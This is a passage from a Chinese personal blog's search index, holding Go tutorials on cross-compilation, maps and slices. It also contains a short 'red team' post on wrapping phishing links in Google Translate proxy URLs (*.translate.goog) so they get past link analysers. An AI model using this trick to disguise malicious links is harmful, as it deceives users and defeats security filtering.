variable">$ENV</span>:CGO_ENABLED<span class="token operator">=</span><span class="token number">0</span><span class="token variable">$ENV</span>:GOOS<span class="token operator">=</span><span class="token string">"darwin"</span><span class="token variable">$ENV</span>:GOARCH<span class="token operator">=</span><span class="token string">"amd64"</span>go build<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Mac编译Linux可执行文件"><a href="#Mac编译Linux可执行文件" class="headerlink" title="Mac编译Linux可执行文件"></a>Mac编译Linux可执行文件</h3><p>Mac电脑编译得到Linux平台64位可执行程序：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>linux <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64 go build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Mac编译Windows可执行文件"><a href="#Mac编译Windows可执行文件" class="headerlink" title="Mac编译Windows可执行文件"></a>Mac编译Windows可执行文件</h3><p>Mac电脑编译得到Windows平台64位可执行程序：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>windows <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64 go build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Linux编译Mac可执行文件"><a href="#Linux编译Mac可执行文件" class="headerlink" title="Linux编译Mac可执行文件"></a>Linux编译Mac可执行文件</h3><p>Linux平台下编译Mac平台64位可执行程序：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>darwin <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64 go build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Linux编译Windows可执行文件"><a href="#Linux编译Windows可执行文件" class="headerlink" title="Linux编译Windows可执行文件"></a>Linux编译Windows可执行文件</h3><p>Linux平台下编译Windows平台64位可执行程序：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>windows <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64 go build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go+VScode开发环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google翻译的域名diao鱼</title>
      <link href="/2021/10/28/google-fan-yi-de-yu-ming-diao-yu/"/>
      <url>/2021/10/28/google-fan-yi-de-yu-ming-diao-yu/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过隐藏在 Google 的域后面来绕过链接分析器</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>使用谷歌翻译：<a href="https://translate.google.com/">https://translate.google.com/</a></p><p>以<code>https://Redamancy404.github.io</code>为例</p><p>获得翻译后的链接</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111122021124.png" alt="image-20211112201536980"></p><p>单击跳转</p><pre class="line-numbers language-none"><code class="language-none">https://redamancy404-github-io.translate.goog/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=zh-CN&amp;_x_tr_pto=nui<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111122021126.png" alt="image-20211112201937717"></p><p>域名格式</p><p>已翻译的域显示在下方<code>*.translate.goog</code>，并且删除谷歌翻译栏</p><p>最终格式如下所示：</p><pre class="line-numbers language-none"><code class="language-none">https://redamancy404-github-io.translate.goog/?_x_tr_sl=en&amp;_x_tr_tl=en<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111122021127.png" alt="image-20211112201730448"></p><p>注：当用户单击界面内的另一个链接时，该 URL 将恢复为真实的域名</p>]]></content>
      
      
      <categories>
          
          <category> 红队技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Google翻译的域名diao鱼 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go语言map学习</title>
      <link href="/2021/10/28/go-yu-yan-map/"/>
      <url>/2021/10/28/go-yu-yan-map/</url>
      
        <content type="html"><![CDATA[<h1 id="map"><a href="#map" class="headerlink" title="map"></a>map</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Go语言中提供的映射关系容器为<code>map</code></p><p>内部使用<code>散列表（hash）</code>实现</p><p>map是一种无序的基于<code>key-value</code>的数据结构</p><p>Go语言中的map是引用类型，必须初始化才能使用</p><h2 id="map定义"><a href="#map定义" class="headerlink" title="map定义"></a>map定义</h2><p> <code>map</code>的定义语法如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">map</span><span class="token punctuation">[</span>KeyType<span class="token punctuation">]</span>ValueType<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，</p><ul><li>KeyType:表示键的类型。</li><li>ValueType:表示键对应的值的类型。</li></ul><p>map类型的变量默认初始值为nil，<strong>需要使用make()函数来申请内存</strong>。语法为：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span>KeyType<span class="token punctuation">]</span>ValueType<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token builtin">cap</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中cap表示map的容量，该参数虽然不是必须的，但是我们应该在初始化map的时候就为其指定一个合适的容量。</p><h2 id="map基本使用"><a href="#map基本使用" class="headerlink" title="map基本使用"></a>map基本使用</h2><p>map中的数据都是成对出现的</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>sMap <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment">// 声明并用make初始化map</span>sMap<span class="token punctuation">[</span><span class="token string">"张三"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">90</span>sMap<span class="token punctuation">[</span><span class="token string">"李四"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>sMap<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>sMap<span class="token punctuation">[</span><span class="token string">"李四"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"type of a:%T\n"</span><span class="token punctuation">,</span> sMap<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102116684.png" alt="image-20211110202709415"></p><p>map也支持在声明的时候填充元素</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>userInfo <span class="token operator">:=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span> <span class="token comment">//声明并用{}初始化map</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"每天都要努力哇！"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123456"</span><span class="token punctuation">,</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>userInfo<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102116265.png" alt="image-20211110201739772"></p><h2 id="判断某个键是否存在"><a href="#判断某个键是否存在" class="headerlink" title="判断某个键是否存在"></a>判断某个键是否存在</h2><p>判断map中键是否存在的特殊写法，格式如下:</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">value<span class="token punctuation">,</span> ok <span class="token operator">:=</span> <span class="token keyword">map</span><span class="token punctuation">[</span>KeyType<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>举个例子：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>smap <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>smap<span class="token punctuation">[</span><span class="token string">"张三"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">90</span>smap<span class="token punctuation">[</span><span class="token string">"李四"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token comment">// 如果KeyType存在ok为true,v为对应的值</span>    <span class="token comment">// 不存在ok为false,v为值类型的零值</span>v<span class="token punctuation">,</span> ok <span class="token operator">:=</span> smap<span class="token punctuation">[</span><span class="token string">"张三"</span><span class="token punctuation">]</span><span class="token keyword">if</span> ok <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"查无此人"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102116152.png" alt="image-20211110202640056"></p><h2 id="map的遍历"><a href="#map的遍历" class="headerlink" title="map的遍历"></a>map的遍历</h2><p>使用<code>for range</code>遍历map</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>sMap <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>sMap<span class="token punctuation">[</span><span class="token string">"张三"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">90</span>sMap<span class="token punctuation">[</span><span class="token string">"李四"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> sMap <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102116937.png" alt="image-20211110202536839"></p><p>但我们只想遍历key的时候，可以按下面的写法：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>sMap <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>sMap<span class="token punctuation">[</span><span class="token string">"张三"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">90</span>sMap<span class="token punctuation">[</span><span class="token string">"李四"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token keyword">for</span> k <span class="token operator">:=</span> <span class="token keyword">range</span> sMap <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意：</strong> 遍历map时的元素顺序与添加键值对的顺序无关。</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102116990.png" alt="image-20211110202608206"></p><h2 id="删除键值对"><a href="#删除键值对" class="headerlink" title="删除键值对"></a>删除键值对</h2><p>使用<code>delete()</code>内建函数</p><p>从map中删除一组键值对，<code>delete()</code>函数的格式如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token function">delete</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，</p><ul><li>map:表示要删除键值对的map</li><li>key:表示要删除的键值对的键</li></ul><p>示例代码如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>sMap <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>sMap<span class="token punctuation">[</span><span class="token string">"张三"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">90</span>sMap<span class="token punctuation">[</span><span class="token string">"李四"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token function">delete</span><span class="token punctuation">(</span>sMap<span class="token punctuation">,</span> <span class="token string">"张三"</span><span class="token punctuation">)</span><span class="token comment">//将小明:90从map中删除</span><span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token operator">:=</span> <span class="token keyword">range</span> sMap<span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102116691.png" alt="image-20211110202853948"></p><h2 id="按照指定顺序遍历map"><a href="#按照指定顺序遍历map" class="headerlink" title="按照指定顺序遍历map"></a>按照指定顺序遍历map</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>rand<span class="token punctuation">.</span><span class="token function">Seed</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">UnixNano</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//初始化随机数种子</span><span class="token keyword">var</span> sMap <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>key <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"stu%02d"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token comment">//生成stu开头的字符串</span>value <span class="token operator">:=</span> rand<span class="token punctuation">.</span><span class="token function">Intn</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>          <span class="token comment">//生成0~99的随机整数</span>sMap<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">}</span><span class="token comment">//取出map中的所有key存入切片newKey</span><span class="token keyword">var</span> newKey <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token keyword">for</span> key <span class="token operator">:=</span> <span class="token keyword">range</span> sMap <span class="token punctuation">{</span>newKey <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>newKey<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">//对切片newKey进行排序</span>sort<span class="token punctuation">.</span><span class="token function">Strings</span><span class="token punctuation">(</span>newKey<span class="token punctuation">)</span><span class="token comment">//按照排序后的newKey遍历map</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> key <span class="token operator">:=</span> <span class="token keyword">range</span> newKey <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> sMap<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117331.png" alt="image-20211110203235057"></p><h2 id="元素为map类型的切片"><a href="#元素为map类型的切片" class="headerlink" title="元素为map类型的切片"></a>元素为map类型的切片</h2><p>切片定义</p><pre class="line-numbers language-none"><code class="language-none">var a := make([]T, size, cap)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>map定义</p><pre class="line-numbers language-none"><code class="language-none">var a := make(map[KeyType]ValueType, [cap])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当T为map时</p><pre class="line-numbers language-none"><code class="language-none">var a := make([]map[string]int, 0, 8)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下面的代码演示了切片中的元素为map类型时的操作：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> mapSlice <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment">//只是完成了切片的初始化</span><span class="token comment">// 对切片中的map元素进行初始化</span>mapSlice<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>mapSlice<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"root"</span>mapSlice<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"123456"</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>mapSlice<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117753.png" alt="image-20211110204719329"></p><h2 id="值为切片类型的map"><a href="#值为切片类型的map" class="headerlink" title="值为切片类型的map"></a>值为切片类型的map</h2><pre class="line-numbers language-none"><code class="language-none">var a := make([]map[string][]int, 8)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下面的代码演示了map中值为切片类型的操作：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> sliceMap <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment">// 只完成了map的初始化</span>v<span class="token punctuation">,</span> ok <span class="token operator">:=</span> sliceMap<span class="token punctuation">[</span><span class="token string">"张三"</span><span class="token punctuation">]</span><span class="token keyword">if</span> ok <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>sliceMap<span class="token punctuation">[</span><span class="token string">"张三"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment">// 对切片进行初始化</span>sliceMap<span class="token punctuation">[</span><span class="token string">"张三"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span>sliceMap<span class="token punctuation">[</span><span class="token string">"张三"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">20</span>sliceMap<span class="token punctuation">[</span><span class="token string">"张三"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">}</span><span class="token comment">// 遍历map</span><span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> sliceMap <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117795.png" alt="image-20211110210442961"></p>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go语言map学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go语言切片学习</title>
      <link href="/2021/10/28/go-yu-yan-qie-pian/"/>
      <url>/2021/10/28/go-yu-yan-qie-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="slice-切片"><a href="#slice-切片" class="headerlink" title="slice(切片)"></a>slice(切片)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>切片（Slice）是一个拥有相同类型元素的可变长度的序列。它是基于数组类型做的一层封装。它非常灵活，支持自动扩容。</p><p>切片是一个引用类型，它的内部结构包含<code>地址</code>、<code>长度</code>、<code>容量</code>。切片一般用于快速地操作一块数据集合。</p><p>切片必须初始化才可以使用</p><p><strong>简单来说，切片就是高级数组</strong></p><h2 id="切片的定义"><a href="#切片的定义" class="headerlink" title="切片的定义"></a>切片的定义</h2><p>声明切片类型的基本语法如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> name <span class="token punctuation">[</span><span class="token punctuation">]</span>T<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>name:表示变量名</li><li>T:表示切片中的元素类型</li></ul><p>举个例子：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 声明切片类型</span><span class="token keyword">var</span> a <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>              <span class="token comment">//声明一个字符串切片</span><span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token punctuation">}</span>             <span class="token comment">//声明一个整型切片并初始化</span><span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">bool</span><span class="token punctuation">{</span><span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">}</span> <span class="token comment">//声明一个布尔切片并初始化</span><span class="token comment">// 输出一下切片的结果</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>        <span class="token comment">//[]</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>        <span class="token comment">//[]</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>        <span class="token comment">//[false true]</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token boolean">nil</span><span class="token punctuation">)</span> <span class="token comment">//true</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token boolean">nil</span><span class="token punctuation">)</span> <span class="token comment">//false</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token boolean">nil</span><span class="token punctuation">)</span> <span class="token comment">//false</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102119421.png" alt="image-20211110122041859"></p><h2 id="切片的长度和容量"><a href="#切片的长度和容量" class="headerlink" title="切片的长度和容量"></a>切片的长度和容量</h2><p>切片拥有自己的长度和容量</p><p>使用内置的<code>len()</code>函数求长度</p><p>使用内置的<code>cap()</code>函数求切片的容量</p><h2 id="切片表达式"><a href="#切片表达式" class="headerlink" title="切片表达式"></a>切片表达式</h2><p>问题：cap怎么计算的</p><p>切片的底层就是一个数组，所以我们可以</p><h3 id="基于数组得到切片"><a href="#基于数组得到切片" class="headerlink" title="基于数组得到切片"></a>基于数组得到切片</h3><p>索引范围（左包含，右不包含）用<code>low</code>、<code>high</code>表示</p><pre class="line-numbers language-none"><code class="language-none">func main() {a := [5]int{1, 2, 3, 4, 5}s := a[1:3] // s := a[low:high]fmt.Printf("s:%v len(s):%v cap(s):%v\n", s, len(s), cap(s))}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102119422.png" alt="image-20211110122742337"></p><p>注：</p><p>1.省略写法</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment">// 等同于 a[3:len(a)]</span>a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span>  <span class="token comment">// 等同于 a[0:3]</span>a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span>   <span class="token comment">// 等同于 a[0:len(a)]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>2.索引越界</p><p><code>0 &lt;= low &lt;= high &lt;= len(a)</code>，则索引合法，否则就会索引越界，发生运行时<code>panic</code></p><h3 